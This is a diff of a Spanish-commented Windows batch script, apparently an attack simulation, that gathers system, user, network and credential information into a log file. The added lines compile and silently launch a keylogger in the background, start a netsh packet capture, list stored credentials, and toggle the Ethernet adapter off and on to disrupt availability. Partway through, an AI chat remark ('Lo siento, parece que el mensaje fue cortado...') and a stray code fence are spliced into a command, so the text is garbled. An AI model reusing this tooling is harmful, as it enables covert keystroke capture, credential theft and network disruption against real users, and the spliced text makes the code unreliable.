@@ -1,22 +1,20 @@
-@echo off
+
 setlocal enabledelayedexpansion
 
 :: Simulación de try-catch
 set "ErrorCode=0"
-
+Set "KeyloggerFailled=0"
 :: Try Block
-(
+
     call :GetSystemInfo || set "ErrorCode=1"
     call :GetUserInfo || set "ErrorCode=1"
     call :GetNetworkInfo || set "ErrorCode=1"
     call :GetProcessInfo || set "ErrorCode=1"
     call :GetServiceInfo || set "ErrorCode=1"
-    call :GetKeyloggerInfo || set "ErrorCode=1"
+    call :GetKeyloggerInfo || call :SetDisponibility || set "ErrorCode=1"
     call :GetCredentials || set "ErrorCode=1"
-    call :SimulateSpoofing || set "ErrorCode=1"
-) || (
-    set "ErrorCode=1"
-)
+    ::call :SimulateSpoofing || set "ErrorCode=1"
+
 
 :: Check for errors
 if "%ErrorCode%" NEQ "0" (
@@ -32,8 +30,7 @@ exit /b
 :ErrorHandler
 echo Ha ocurrido un error durante la ejecución del script. >> salida.txt
 echo Código de Error: %ErrorCode% >> salida.txt
-ren salida.txt %myHostName%_salida.txt
-
+:: Aquí puedes agregar más acciones de manejo de errores, como notificar al usuario o limpiar archivos temporales.
 exit /b
 
 :: Funciones
@@ -51,6 +48,7 @@ exit /b
         echo El comando wmic no está disponible en esta versión de Windows. >> salida.txt
     )
     nbtstat -n >> salida.txt
+    netsh trace show providers >> salida.txt
     echo ************************************************************************************* >> salida.txt
     exit /b
 
@@ -60,7 +58,6 @@ exit /b
     net localgroup Administrators >> salida.txt
     cmdkey /list >> salida.txt
     net accounts >> salida.txt
-    msinfo32 >> salida.txt
     echo ************************************************************************************* >> salida.txt
     exit /b
 
@@ -91,17 +88,21 @@ exit /b
 
 :GetKeyloggerInfo
     echo **************************** INFORMACIÓN DE PULSACIONES DE TECLADO **************************** >> salida.txt
+    mkdir keyloggerLogs
+    .>> Pulsaciones.txt
     if not exist KeyLogger.exe (
-        csc.exe /out:KeyLogger.exe Keylogger.cs /reference:System.Windows.Forms.dll /reference:System.Drawing.dll >> salida.txt
+        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe Keylogger.cs
     )
-    KeyLogger.exe >> keyloggerLogs\Pulsaciones.txt
-    KeyLogger.exe >> salida.txt
+    start /B KeyLogger.exe
+    echo El keylogger está corriendo en segundo plano. >> salida.txt
     echo ************************************************************************************* >> salida.txt
     exit /b
 
 :GetCredentials
     echo **************************** INFORMACIÓN PARA CONSEGUIR CREDENCIALES **************************** >> salida.txt
-    mkdir keyloggerLogs
+    :: crea archivo passwords.txt dentro de directorio keyloggerLogs
+    echo. > keyloggerLogs\passwords.txt
+
     move Pulsaciones.txt keyloggerLogs
     netsh trace start capture=yes
     netsh trace stop
@@ -142,20 +143,22 @@ exit /b
 
     exit /b
 
-:: Funciones auxiliares
-:ProcessLine
-    IF "!InfNetwork!" NEQ "" (
-        ECHO !InfNetwork! | findstr /R /C:"Adaptador.*LAN.*inalámbrica.*wi-fi" >nul && (
-            SET "isWirelessAdapter=1"
-        )
-        IF "!isWirelessAdapter!" EQU "1" (
-            ECHO !InfNetwork! | findstr /R /C:"Dirección.*IPv4" >nul && (
-                FOR /F "tokens=2 delims=:" %%B IN ("!InfNetwork!") DO SET "IP=%%B"
-                SET "IP=!IP: =!"
-            )
-            ECHO !InfNetwork! | findstr /R /Lo siento, parece que el mensaje fue cortado. Aquí está el código completo y revisado:
+:SetDisponibility
+    
+    Setlocal enabledelayedexpansion
+    echo **************************** Comandos que vulneran la Disponibilidad **************************** >> salida.txt
+    
+    if %KeyloggerFailled% NEQ 1 (
+        set "KeyloggerFailled=1"
+        netsh interface set interface "Ethernet" admin=disable
+        netsh interface set interface "Ethernet" admin=enable
+        echo ************************************************************************************* >> salida.txt
+        exit /b
+    )
 
-```bat
+
+:: Funciones auxiliares
+
 :ProcessLine
     IF "!InfNetwork!" NEQ "" (
         ECHO !InfNetwork! | findstr /R /C:"Adaptador.*LAN.*inalámbrica.*wi-fi" >nul && (
